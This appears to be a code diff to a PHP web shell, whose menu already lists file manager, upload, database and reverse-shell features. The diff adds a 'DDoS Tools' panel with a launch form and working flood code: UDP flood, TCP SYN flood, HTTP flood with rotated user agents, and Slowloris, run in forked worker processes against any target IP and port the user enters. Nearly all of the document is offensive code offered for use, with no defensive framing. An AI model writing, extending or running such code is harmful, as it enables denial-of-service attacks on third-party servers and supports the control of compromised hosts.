@@ -72,6 +72,7 @@ $cwd = $_POST['cwd'] ?? getcwd();
         <a href="?action=files">File Manager</a>
         <a href="?action=upload">Upload</a>
         <a href="?action=network">Network Tools</a>
+        <a href="?action=ddos">⚡ DDoS Tools</a>
         <a href="?action=database">Database</a>
         <a href="?action=info">System Info</a>
         <a href="?action=reverse">Reverse Shell</a>
@@ -590,6 +591,263 @@ if (isset($_GET['download'])) {
         readfile($file);
         exit;
     }
+}
+
+// DDoS/Network Attack Tools
+if (isset($_GET['action']) && $_GET['action'] == 'ddos') {
+    $target = isset($_POST['target']) ? $_POST['target'] : '';
+    $port = isset($_POST['port']) ? intval($_POST['port']) : 80;
+    $duration = isset($_POST['duration']) ? intval($_POST['duration']) : 10;
+    $attack_type = isset($_POST['attack_type']) ? $_POST['attack_type'] : 'udp';
+    $threads = isset($_POST['threads']) ? intval($_POST['threads']) : 10;
+    
+    if ($target && isset($_POST['start_attack'])) {
+        echo "<div style='background:#333;color:#0f0;padding:10px;margin:10px 0;'>";
+        echo "<h3>DDoS Attack Initiated</h3>";
+        echo "Target: $target:$port<br>";
+        echo "Type: " . strtoupper($attack_type) . "<br>";
+        echo "Duration: {$duration}s<br>";
+        echo "Threads: $threads<br>";
+        echo "</div>";
+        
+        if ($attack_type == 'udp') {
+            udpFlood($target, $port, $duration, $threads);
+        } elseif ($attack_type == 'tcp') {
+            tcpFlood($target, $port, $duration, $threads);
+        } elseif ($attack_type == 'http') {
+            httpFlood($target, $port, $duration, $threads);
+        } elseif ($attack_type == 'slowloris') {
+            slowlorisAttack($target, $port, $duration, $threads);
+        }
+    }
+    
+    echo "<div style='background:#222;color:#0f0;padding:15px;margin:10px 0;'>";
+    echo "<h2>⚡ DDoS Attack Tools</h2>";
+    echo "<form method='POST'>";
+    echo "<table style='color:#0f0;'>";
+    echo "<tr><td>Target IP/Domain:</td><td><input type='text' name='target' value='$target' style='background:#000;color:#0f0;border:1px solid #0f0;padding:5px;width:200px;'></td></tr>";
+    echo "<tr><td>Port:</td><td><input type='number' name='port' value='$port' style='background:#000;color:#0f0;border:1px solid #0f0;padding:5px;width:100px;'></td></tr>";
+    echo "<tr><td>Duration (seconds):</td><td><input type='number' name='duration' value='$duration' style='background:#000;color:#0f0;border:1px solid #0f0;padding:5px;width:100px;'></td></tr>";
+    echo "<tr><td>Threads:</td><td><input type='number' name='threads' value='$threads' style='background:#000;color:#0f0;border:1px solid #0f0;padding:5px;width:100px;'></td></tr>";
+    echo "<tr><td>Attack Type:</td><td>";
+    echo "<select name='attack_type' style='background:#000;color:#0f0;border:1px solid #0f0;padding:5px;'>";
+    echo "<option value='udp'" . ($attack_type == 'udp' ? ' selected' : '') . ">UDP Flood</option>";
+    echo "<option value='tcp'" . ($attack_type == 'tcp' ? ' selected' : '') . ">TCP SYN Flood</option>";
+    echo "<option value='http'" . ($attack_type == 'http' ? ' selected' : '') . ">HTTP Flood</option>";
+    echo "<option value='slowloris'" . ($attack_type == 'slowloris' ? ' selected' : '') . ">Slowloris</option>";
+    echo "</select></td></tr>";
+    echo "<tr><td colspan='2'><input type='submit' name='start_attack' value='🚀 Launch Attack' style='background:#0f0;color:#000;border:none;padding:10px 20px;font-weight:bold;cursor:pointer;'></td></tr>";
+    echo "</table>";
+    echo "</form>";
+    echo "</div>";
+}
+
+// UDP Flood Implementation
+function udpFlood($target, $port, $duration, $threads) {
+    $payload = str_repeat('A', 1024); // 1KB payload
+    $endTime = time() + $duration;
+    
+    echo "<div style='color:#0f0;background:#000;padding:10px;margin:10px 0;'>";
+    echo "🔥 UDP Flood Attack Started...<br>";
+    echo "Sending UDP packets to $target:$port<br>";
+    echo "Payload size: " . strlen($payload) . " bytes<br>";
+    echo "</div>";
+    
+    // Fork multiple processes for threading effect
+    for ($t = 0; $t < $threads; $t++) {
+        if (function_exists('pcntl_fork')) {
+            $pid = pcntl_fork();
+            if ($pid == 0) {
+                // Child process
+                udpFloodWorker($target, $port, $endTime, $payload);
+                exit;
+            }
+        } else {
+            // Fallback: sequential execution
+            udpFloodWorker($target, $port, $endTime, $payload);
+            break;
+        }
+    }
+    
+    // Wait for threads to complete
+    if (function_exists('pcntl_wait')) {
+        for ($t = 0; $t < $threads; $t++) {
+            pcntl_wait($status);
+        }
+    }
+    
+    echo "<div style='color:#ff0;background:#000;padding:10px;margin:10px 0;'>";
+    echo "✅ UDP Flood Attack Completed!";
+    echo "</div>";
+}
+
+function udpFloodWorker($target, $port, $endTime, $payload) {
+    $packets_sent = 0;
+    
+    while (time() < $endTime) {
+        $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+        if ($socket) {
+            socket_sendto($socket, $payload, strlen($payload), 0, $target, $port);
+            socket_close($socket);
+            $packets_sent++;
+        }
+        
+        // Small delay to prevent overwhelming the server
+        usleep(1000); // 1ms
+    }
+    
+    return $packets_sent;
+}
+
+// TCP SYN Flood Implementation
+function tcpFlood($target, $port, $duration, $threads) {
+    $endTime = time() + $duration;
+    
+    echo "<div style='color:#0f0;background:#000;padding:10px;margin:10px 0;'>";
+    echo "🔥 TCP SYN Flood Attack Started...<br>";
+    echo "Targeting $target:$port<br>";
+    echo "</div>";
+    
+    for ($t = 0; $t < $threads; $t++) {
+        if (function_exists('pcntl_fork')) {
+            $pid = pcntl_fork();
+            if ($pid == 0) {
+                tcpFloodWorker($target, $port, $endTime);
+                exit;
+            }
+        } else {
+            tcpFloodWorker($target, $port, $endTime);
+            break;
+        }
+    }
+    
+    if (function_exists('pcntl_wait')) {
+        for ($t = 0; $t < $threads; $t++) {
+            pcntl_wait($status);
+        }
+    }
+    
+    echo "<div style='color:#ff0;background:#000;padding:10px;margin:10px 0;'>";
+    echo "✅ TCP SYN Flood Attack Completed!";
+    echo "</div>";
+}
+
+function tcpFloodWorker($target, $port, $endTime) {
+    while (time() < $endTime) {
+        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        if ($socket) {
+            socket_set_nonblock($socket);
+            @socket_connect($socket, $target, $port);
+            socket_close($socket);
+        }
+        usleep(1000);
+    }
+}
+
+// HTTP Flood Implementation
+function httpFlood($target, $port, $duration, $threads) {
+    $endTime = time() + $duration;
+    $user_agents = array(
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101'
+    );
+    
+    echo "<div style='color:#0f0;background:#000;padding:10px;margin:10px 0;'>";
+    echo "🔥 HTTP Flood Attack Started...<br>";
+    echo "Targeting http://$target:$port/<br>";
+    echo "</div>";
+    
+    for ($t = 0; $t < $threads; $t++) {
+        if (function_exists('pcntl_fork')) {
+            $pid = pcntl_fork();
+            if ($pid == 0) {
+                httpFloodWorker($target, $port, $endTime, $user_agents);
+                exit;
+            }
+        } else {
+            httpFloodWorker($target, $port, $endTime, $user_agents);
+            break;
+        }
+    }
+    
+    if (function_exists('pcntl_wait')) {
+        for ($t = 0; $t < $threads; $t++) {
+            pcntl_wait($status);
+        }
+    }
+    
+    echo "<div style='color:#ff0;background:#000;padding:10px;margin:10px 0;'>";
+    echo "✅ HTTP Flood Attack Completed!";
+    echo "</div>";
+}
+
+function httpFloodWorker($target, $port, $endTime, $user_agents) {
+    while (time() < $endTime) {
+        $ua = $user_agents[array_rand($user_agents)];
+        $context = stream_context_create([
+            'http' => [
+                'method' => 'GET',
+                'header' => "User-Agent: $ua\r\n" .
+                           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" .
+                           "Accept-Language: en-US,en;q=0.5\r\n" .
+                           "Accept-Encoding: gzip, deflate\r\n" .
+                           "Connection: keep-alive\r\n",
+                'timeout' => 1
+            ]
+        ]);
+        
+        @file_get_contents("http://$target:$port/", false, $context);
+        usleep(500);
+    }
+}
+
+// Slowloris Attack Implementation
+function slowlorisAttack($target, $port, $duration, $connections) {
+    $endTime = time() + $duration;
+    $sockets = array();
+    
+    echo "<div style='color:#0f0;background:#000;padding:10px;margin:10px 0;'>";
+    echo "🐌 Slowloris Attack Started...<br>";
+    echo "Opening $connections slow connections to $target:$port<br>";
+    echo "</div>";
+    
+    // Open initial connections
+    for ($i = 0; $i < $connections; $i++) {
+        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+        if ($socket && @socket_connect($socket, $target, $port)) {
+            socket_set_nonblock($socket);
+            $sockets[] = $socket;
+            
+            // Send partial HTTP request
+            $request = "GET / HTTP/1.1\r\nHost: $target\r\nUser-Agent: Mozilla/5.0\r\n";
+            socket_write($socket, $request);
+        }
+    }
+    
+    // Keep connections alive with slow headers
+    $header_count = 0;
+    while (time() < $endTime && count($sockets) > 0) {
+        foreach ($sockets as $key => $socket) {
+            $header = "X-Header-$header_count: value\r\n";
+            if (@socket_write($socket, $header) === false) {
+                socket_close($socket);
+                unset($sockets[$key]);
+            }
+        }
+        $header_count++;
+        sleep(10); // Send header every 10 seconds
+    }
+    
+    // Close remaining sockets
+    foreach ($sockets as $socket) {
+        socket_close($socket);
+    }
+    
+    echo "<div style='color:#ff0;background:#000;padding:10px;margin:10px 0;'>";
+    echo "✅ Slowloris Attack Completed!";
+    echo "</div>";
 }
 ?>
 
